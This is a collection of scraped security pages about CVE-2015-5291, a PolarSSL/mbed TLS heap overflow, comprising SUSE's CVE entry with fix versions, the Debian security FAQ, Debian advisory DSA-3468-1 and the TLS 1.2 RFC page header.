* [![Linux](https://www.suse.com/assets/img/icons/Linux-one-color.svg)](https://www.suse.com/solutions/linux/)
* [![Cloud Native](https://www.suse.com/assets/img/icons/Cloud-native-one-color.svg)](https://www.suse.com/solutions/cloud-native/)
* [![Edge](https://www.suse.com/assets/img/icons/Edge-one-color.svg)](https://www.suse.com/solutions/edge/)
* [![AI](https://www.suse.com/assets/img/icons/AI-one-color.svg)](https://www.suse.com/solutions/ai/)

Solutions

* [Run SAP

  Run & secure cloud and on-prem workloads](https://www.suse.com/solutions/run-sap-solutions/)
* [Public Cloud

  Accelerate and innovate across your cloud environment](https://www.suse.com/solutions/public-cloud/)
* [Observability

  Rapid, full-stack visibility in under 5 minutes](https://www.suse.com/solutions/observability/)
* [Security

  Secure your digital enterprise](https://www.suse.com/solutions/security/)

Industries

* [Automotive](https://www.suse.com/sector/automotive/)
* [Telecom](https://www.suse.com/sector/telco/)
* [Banking and Financial Systems](https://www.suse.com/sector/banking-financial-services/)
* [Healthcare](https://www.suse.com/sector/healthcare/)
* [Manufacturing](https://www.suse.com/sector/manufacturing/)
* [Retail](https://www.suse.com/sector/retail/)
* [Technology & Software](https://www.suse.com/sector/technology/)
* [Federal](https://www.ranchergovernment.com/)
* [Pharma](https://www.suse.com/sector/pharma/)
* [Energy](https://www.suse.com/sector/energy/)

 Back
Support

* [Product Support

  SUSE Customer Center](https://scc.suse.com/home)
* [Premium Support Services

  Dedicated support services from a premium team](https://www.suse.com/services/premium/)
* [Long Term Services Support

  Stay on your existing product version](https://www.suse.com/products/long-term-service-pack-support/)
* [Renew Your Support Subscription

  Partners with cloud providers](https://www.suse.com/renewals/)
* [![AWS](https://www.suse.com/assets/img/icons/320px-Amazon3.svg)](https://aws.amazon.com/marketplace/search/results?searchTerms=suse)
* [![Microsoft Azure](https://www.suse.com/assets/img/icons/Microsoft_Azure3.svg)](https://azure.microsoft.com/solutions/linux-on-azure/suse/)
* [![Google](https://www.suse.com/assets/img/icons/lockup_GoogleCloud_FullColor_rgb_139x24px 1.svg)](https://console.cloud.google.com/marketplace/browse?q=SUSE)

Services

* [Consulting Services](https://www.suse.com/services/)
* [Training & Certification](https://www.suse.com/training/)
* [Premium Technical Advisory Services](https://www.suse.com/services/premium-technical-advisory/)

Resources

* [SUSE Support User Guide](https://www.suse.com/support/handbook/)
* [Patches & Updates](https://download.suse.com/patch/finder/)
* [Product Documentation](https://documentation.suse.com/)
* [Knowledgebase](https://www.suse.com/support/kb/)
* [Product Support Life Cycle](https://www.suse.com/lifecycle/)
* [Package Hub

  Community packages for SUSE Linux Enterprise Server](https://packagehub.suse.com/)
* [Driver Search](https://drivers.suse.com/)
* [Support Forums](https://forums.suse.com/forum.php)
* [Developer Services](https://www.suse.com/services/support-offerings/developer-services/)
* [Beta Program](https://www.suse.com/betaprogram/)
* [Security](https://www.suse.com/support/security/)

 Back
Partners

* [Partner Program](https://www.suse.com/partners/)
* [Find a Partner](https://www.suse.com/partners/find-partner/)
* [Become a Partner](https://www.suse.com/partners/become-partner/)
* [Login to the SUSE Partner Portal](https://partner.suse.com/)

 Back
Communities

* [Blog](https://www.suse.com/c/blog/)
* [Forum](https://forums.suse.com/forum.php)
* [Open Source Projects](http://opensource.suse.com/)
* [openSUSE.org](https://www.opensuse.org/)

 Back
About

* [About](https://www.suse.com/company/about/)
* [Leadership](https://www.suse.com/leadership/)
* [Careers](https://jobs.suse.com/)
* [Newsroom](https://www.suse.com/news/)
* [Success Stories](https://www.suse.com/success/)
* [Investor Relations](https://ir.suse.com/)
* [Social Impact](https://www.suse.com/esg/)
* [SUSE Logo and Brand](https://brand.suse.com/)
* [Events](https://www.suse.com/events/)
* [Merchandise Store](https://www.susemerchandise.com/)

# CVE-2015-5291

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2015-5289.html) [[Index]](index.html) [[Next]](CVE-2015-5292.html)

### Upstream information

[CVE-2015-5291 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5291)

#### Description

Heap-based buffer overflow in PolarSSL 1.x before 1.2.17 and ARM mbed TLS (formerly PolarSSL) 1.3.x before 1.3.14 and 2.x before 2.1.2 allows remote SSL servers to cause a denial of service (client crash) and possibly execute arbitrary code via a long hostname to the server name indication (SNI) extension, which is not properly handled when creating a ClientHello message. NOTE: this identifier has been SPLIT per ADT3 due to different affected version ranges. See CVE-2015-8036 for the session ticket issue that was introduced in 1.3.0.

---

### [SUSE information](https://www.suse.com/c/cve-pages-self-help-security-issues-suse-linux-enterprise/)

Overall state of this security issue: Resolved

This issue is currently rated as having [important](https://www.suse.com/support/security/rating/) severity.

[CVSS v2 Scores](https://nvd.nist.gov/cvss.cfm)
|  | National Vulnerability Database |
| Base Score | 6.8 |
| Vector | AV:N/AC:M/Au:N/C:P/I:P/A:P |
| Access Vector | Network |
| Access Complexity | Medium |
| Authentication | None |
| Confidentiality Impact | Partial |
| Integrity Impact | Partial |
| Availability Impact | Partial |

SUSE Bugzilla entries: [949380](https://bugzilla.suse.com/show_bug.cgi?id=949380) [RESOLVED / FIXED], [989694](https://bugzilla.suse.com/show_bug.cgi?id=989694) [RESOLVED / FIXED]
### SUSE Security Advisories:

* [openSUSE-SU-2015:2257-1](https://lists.opensuse.org/archives/list/security-announce%40lists.opensuse.org/thread/E5TLNZZQUO45PVXGT6S2YSICBQSLYZRH/#E5TLNZZQUO45PVXGT6S2YSICBQSLYZRH), published Fri Dec 8 15:48:34 2023
openSUSE-SU-2015:2371-1
### List of released packages

| Product(s) | Fixed package version(s) | References |
| --- | --- | --- |
| openSUSE Tumbleweed | * `libmbedcrypto0 >= 2.4.0-1.2` * `libmbedcrypto0-32bit >= 2.4.0-1.2` * `libmbedcrypto7 >= 2.28.3-1.1` * `libmbedcrypto7-x86-64-v3 >= 2.28.3-1.1` * `libmbedtls10 >= 2.4.0-1.2` * `libmbedtls10-32bit >= 2.4.0-1.2` * `libmbedtls14 >= 2.28.3-1.1` * `libmbedtls14-x86-64-v3 >= 2.28.3-1.1` * `libmbedx509-0 >= 2.4.0-1.2` * `libmbedx509-0-32bit >= 2.4.0-1.2` * `libmbedx509-1 >= 2.28.3-1.1` * `libmbedx509-1-x86-64-v3 >= 2.28.3-1.1` * `mbedtls-2-devel >= 2.28.3-1.1` * `mbedtls-devel >= 2.4.0-1.2` | Patchnames: openSUSE-Tumbleweed-2024-10088openSUSE-Tumbleweed-2024-12903 |

---

### SUSE Timeline for this CVE

CVE page created: Thu Oct 8 10:21:35 2015

CVE page last modified: Tue Sep 3 18:30:38 2024

![SUSE Logo](https://www.suse.com/assets/img/suse-white-logo-green.svg)

* [Careers](https://jobs.suse.com/ "Careers")
* [Legal](https://www.suse.com/company/legal/ "Legal")
* [Anti-Slavery Statement](https://links.imagerelay.com/cdn/3404/ql/811b4f2364b94ff18eb15e315b3e263d/suse_anti_slavery_statement.pdf "Anti-Slavery Statement")
* [Anti-slavery](https://www.suse.com/legal/anti-slavery/ "Anti-slavery")
* [About](https://www.suse.com/company/about/ "About")
* [Communications Preferences](https://www.suse.com/company/subscribe/ "Communications Preferences")
* [Contact Us](https://www.suse.com/contact/ "Contact Us")
* [Let's Chat](#footer-chat-now "Let's Chat")

* [![](https://www.suse.com/assets/img/youtube.png)](https://www.youtube.com/channel/UCHTfqIzPKz4f_dri36lAQGA%20)
* [![](https://www.suse.com/assets/img/fn-fbook-ico-white.png)](https://www.facebook.com/SUSEWorldwide)
* [![](https://www.suse.com/assets/img/logo-black.png)](https://www.twitter.com/SUSE)
* [![](https://www.suse.com/assets/img/fn-link-ico-white.png)](https://www.linkedin.com/company/suse)
* ![WeChat](https://www.suse.com/assets/img/icons/WeChat.png)

![WeChat QR](https://www.suse.com/assets/img/icons/qrcode_for_gh_91d12717ed53_430.jpg)

Support: [Open a Support Case](https://www.suse.com/support/handbook/#open)

©  ©SUSE, All Rights Reserved

Cookie Settings

[Privacy Policy](https://www.suse.com/company/legal/) and
[Cookie Policy](https://www.suse.com/company/legal/cookies-policy/)

X

×



=== Content from www.debian.org_2c992b25_20250126_093436.html ===

[![Debian](../Pics/openlogo-50.png)](../ "Debian Home")

[Skip Quicknav](#content)

* [Blog](https://bits.debian.org/ "Bits from Debian")
* [Micronews](https://micronews.debian.org "Micronews from Debian")
* [Planet](https://planet.debian.org/ "The Planet of Debian")

[Security Information](./)
/
Debian security FAQ

# Debian security FAQ

1. [I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?](#buthow)- [The signature on your advisories does not verify correctly!](#signature)- [How is security handled in Debian?](#handling)- [Why are you fiddling with an old version of that package?](#oldversion)- [The version number for a package indicates that I am still running a vulnerable version!](#version)- [I received an advisory, but the build for one processor architecture seems to be missing.](#archismissing)- [How is security handled for unstable?](#unstable)- [How is security handled for testing?](#testing)- [How is security handled for contrib, non-free and non-free-firmware?](#contrib)- [The advisory says unstable is fixed in version 1.2.3-1, but unstable has 1.2.5-1, what's up?](#sidversionisold)- [Why are there no official mirrors for security.debian.org?](#mirror)- [I've seen DSA 100 and DSA 102, now where is DSA 101?](#missing)- [How can I reach the security team?](#contact)- [I guess I found a security problem, what should I do?](#discover)- [What am I supposed to do with a security problem in one of my packages?](#care)- [I tried to download a package listed in one of the security advisories, but I got a `file not found' error.](#enofile)- [I've got a bugfix, can I upload to security.debian.org directly?](#upload)- [I've got a bugfix, can I upload to proposed-updates instead?](#ppu)- [I'm pretty sure my packages are fine, how can I upload them?](#SecurityUploadQueue)- [How can I help with security?](#help)- [What is the scope of proposed-updates?](#proposed-updates)- [How is the security team composed?](#composing)- [How long will security updates be provided?](#lifespan)- [How can I check the integrity of packages?](#check)- [What to do if a random package breaks after a security update?](#break)- [What is a CVE identifier?](#cvewhat)- [Does Debian issue a DSA for every CVE id?](#cvedsa)- [Can Debian assign CVE identifiers?](#cveget)- [Does Debian have a vulnerability disclosure policy?](#disclosure-policy)- [Our vulnerability management tool has shown that the following issues are open (list of CVEs with random CVSS scores). When are those going to be fixed?](#cve-severity-assessment)- [What does local (remote) mean?](#localremote)

*Q: I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?*

A: As the DSA mail says, you should upgrade the packages affected by the
announced vulnerability. You can do this by just upgrading (after
updating the list of available packages with apt-get update)
every package in your system with apt-get upgrade or by
upgrading just a particular package, with apt-get install
*package*.

The announcement mail mentions the source package in which the vulnerability
was present. Therefore, you should update all the binary packages from
that source package. To check the binary packages to update, visit
https://packages.debian.org/src:*source-package-name* and
click on *[show ... binary packages]* for the distribution you
are updating.

It may also be necessary to restart a service or a running process. The
command [checkrestart](https://manpages.debian.org/checkrestart)
included in the package
[debian-goodies](https://packages.debian.org/debian-goodies)
might help to find which ones.

*Q: The signature on your advisories does not verify correctly!*

A: This is most likely a problem on your end. The
[debian-security-announce](https://lists.debian.org/debian-security-announce/)
list has a filter that only allows messages with a correct signature
from one of the security team members to be posted.

Most likely some piece of mail software on your end slightly changes
the message that breaks the signature. Make sure your software does
not do any MIME encoding or decoding, or tab/space conversions.

Known culprits are fetchmail (with the mimedecode option enabled),
formail (from procmail 3.14 only) and evolution.

*Q: How is security handled in Debian?*

A: Once the security team receives a notification of an incident,
one or more members review it and consider its impact on the stable
release of Debian (i.e. if it's vulnerable or not).
If our system is vulnerable, we work on a fix for the
problem. The package maintainer is contacted as well, if they didn't
contact the security team already. Finally, the fix is tested and
new packages are prepared, which are then compiled on all stable
architectures and uploaded afterwards. After all of that is done,
an advisory is published.

*Q: Why are you fiddling with an old version of that package?*

The most important guideline when making a new package that fixes a
security problem is to make as few changes as possible. Our users and
developers are relying on the exact behaviour of a release once it is made,
so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

---

Back to the [Debian Project homepage](../).

---

This page is also available in the following languages:
Select your language
dansk
Deutsch
español
français
Italiano
Nederlands
polski
Português
suomi
svenska
Русский (Russkij)
中文(简)
中文(HK)
中文(繁)
日本語 (Nihongo)

How to set [the default document language](../intro/cn)

---

**[Home](/)**

* [About](../intro/about)
  + [Social Contract](../social_contract)
  + [Code of Conduct](../code_of_conduct)
  + [Free Software](../intro/free)
  + [Legal Info](../legal)
* [Help Debian](../intro/help)

* [Getting Debian](../distrib/)
  + [Network install](../distrib/netinst)
  + [CD/USB ISO images](../CD/)
  + [Pure Blends](../blends/)
  + [Debian Packages](../distrib/packages)
  + [Developers' Corner](../devel/)

* [News](../News/)
  + [Project News](../News/weekly/)
  + [Events](../events/)
* [Documentation](../doc/)
  + [Release Info](../releases/)
  + [Debian Wiki](https://wiki.debian.org/)

* [Support](../support)
  + [Debian International](../international/)
  + [Security Information](../security/)
  + [Bug reports](../Bugs/)
  + [Mailing Lists](../MailingLists/)

* [Site map](../sitemap)
* [Search](https://search.debian.org/)
* [The Debian Blog](https://bits.debian.org)
* [Debian Micronews](https://micronews.debian.org)
* [Debian Planet](https://planet.debian.org)

See our [contact page](../contact) to get in touch. Web site source code is [available](https://salsa.debian.org/webmaster-team/webwml).

Last Modified: Fri, Oct 6 21:55:11 UTC 2023

Last Built: Sat, Jan 11 19:35:55 UTC 2025

Copyright © 1997-2023 [SPI](https://www.spi-inc.org/) and others; See [license terms](../license)

Debian is a registered [trademark](../trademark) of Software in the Public Interest, Inc.



=== Content from www.debian.org_8dae1785_20250125_143419.html ===


---

[[Date Prev](msg00037.html)][[Date Next](msg00039.html)]
[[Thread Prev](msg00037.html)][[Thread Next](msg00039.html)]
[[Date Index](maillist.html#00038)]
[[Thread Index](threads.html#00038)]

# [SECURITY] [DSA 3468-1] polarssl security update

---

* *To*: debian-security-announce@lists.debian.org
* *Subject*: [SECURITY] [DSA 3468-1] polarssl security update
* *From*: Sebastien Delafond <seb@debian.org>
* *Date*: Sat, 06 Feb 2016 19:34:16 +0000
* *Message-id*: <[[🔎]](/msgid-search/E1aS8ca-0006Ue-AK%40seger.debian.org) [E1aS8ca-0006Ue-AK@seger.debian.org](msg00038.html)>
* *Reply-to*: debian-security@lists.debian.org

---

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

- -------------------------------------------------------------------------
Debian Security Advisory DSA-3468-1                   security@debian.org
<https://www.debian.org/security/>                       Sebastien Delafond
February 06, 2016                     <https://www.debian.org/security/faq>
- -------------------------------------------------------------------------

Package        : polarssl
CVE ID         : CVE-2015-5291 CVE-2015-8036
Debian Bug     : 801413

It was discovered that polarssl, a library providing SSL and TLS
support, contained two heap-based buffer overflows that could allow a
remote attacker to trigger denial of service (via application crash)
or arbitrary code execution.

For the oldstable distribution (wheezy), these problems have been fixed
in version 1.2.9-1~deb7u6.

For the stable distribution (jessie), these problems have been fixed in
version 1.3.9-2.1+deb8u1.

We recommend that you upgrade your polarssl packages.

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQEcBAEBCgAGBQJWtkfZAAoJEBC+iYPz1Z1kxWEH/1fsiH2n6XQugpHDNHB9Iosz
XHKqBylycjr9+RLXk+7HQ0wFeX+R4uKORPUsMK4ryaSpVqUs7vd5qU7obBH+7+XG
mvJpTq97vZTY17TI0NWTjMJN44i87p5XLRHMhv5VwdayP/ao72Yvx/aZzu7PRdbw
reULAgoYoIt1ln/h824TvFv24BgAGetYT6j6PXmDoYBomcu2xICoGM0aLY1fHAqt
qf5NWD+iu6WlLVwRBqu0RAzh/c+NfbLizGkyWGF9sl6svzfbd1Dd/U6osHp42QZK
an41m17Z2e3N6hGrKTpvwrAhfx8Gc26z5O1iC1i6g163RiUFHgbDC3sWbEzK7/0=
=FmHk
-----END PGP SIGNATURE-----

```

---



=== Content from tools.ietf.org_be610006_20250126_093427.html ===


* Light
* Dark
* Auto

[RFC 5246

Proposed Standard](/doc/rfc5246/)

|  | Title |  | The Transport Layer Security (TLS) Protocol Version 1.2 |
| --- | --- | --- | --- |
| Document | Document type |  | RFC - Proposed Standard  August 2008  [View errata](https://www.rfc-editor.org/errata_search.php?rfc=5246 "Click to view errata.") [Report errata](https://www.rfc-editor.org/errata.php#reportnew "Click to report an error in the document.") [IPR](/ipr/search/?submit=draft&id=rfc5246 "Click to view IPR declarations.") Obsoleted by [RFC 8446](/doc/html/rfc8446 "The Transport Layer Security (TLS) Protocol Version 1.3") Updated by [RFC 7627](/doc/html/rfc7627 "Transport Layer Security (TLS) Session Hash and Extended Master Secret Extension"), [RFC 9155](/doc/html/rfc9155 "Deprecating MD5 and SHA-1 Signature Hashes in TLS 1.2 and DTLS 1.2"), [RFC 5878](/doc/html/rfc5878 "Transport Layer Security (TLS) Authorization Extensions"), [RFC 5746](/doc/html/rfc5746 "Transport Layer Security (TLS) Renegotiation Indication Extension"), [RFC 6176](/doc/html/rfc6176 "Prohibiting Secure Sockets Layer (SSL) Version 2.0"), [RFC 7465](/doc/html/rfc7465 "Prohibiting RC4 Cipher Suites"), [RFC 7507](/doc/html/rfc7507 "TLS Fallback Signaling Cipher Suite Value (SCSV) for Preventing Protocol Downgrade Attacks"), [RFC 7568](/doc/html/rfc7568 "Deprecating Secure Sockets Layer Version 3.0"), [RFC 7685](/doc/html/rfc7685 "A Transport Layer Security (TLS) ClientHello Padding Extension"), [RFC 7905](/doc/html/rfc7905 "ChaCha20-Poly1305 Cipher Suites for Transport Layer Security (TLS)"), [RFC 7919](/doc/html/rfc7919 "Negotiated Finite Field Diffie-Hellman Ephemeral Parameters for Transport Layer Security (TLS)"), [RFC 8447](/doc/html/rfc8447 "IANA Registry Updates for TLS and DTLS") Obsoletes [RFC 4346](/doc/html/rfc4346 "The Transport Layer Security (TLS) Protocol Version 1.1"), [RFC 4366](/doc/html/rfc4366 "Transport Layer Security (TLS) Extensions"), [RFC 3268](/doc/html/rfc3268 "Advanced Encryption Standard (AES) Ciphersuites for Transport Layer Security (TLS)") Updates [RFC 4492](/doc/html/rfc4492 "Elliptic Curve Cryptography (ECC) Cipher Suites for Transport Layer Security (TLS)") Was [draft-ietf-tls-rfc4346-bis](/doc/draft-ietf-tls-rfc4346-bis/10/) ([tls WG](/wg/tls/about/)) |
| --- | --- | --- | --- |
|  | Select version |  | * [10](/doc/html/draft-ietf-tls-rfc4346-bis-10) * [RFC 5246](/doc/html/rfc5246) |
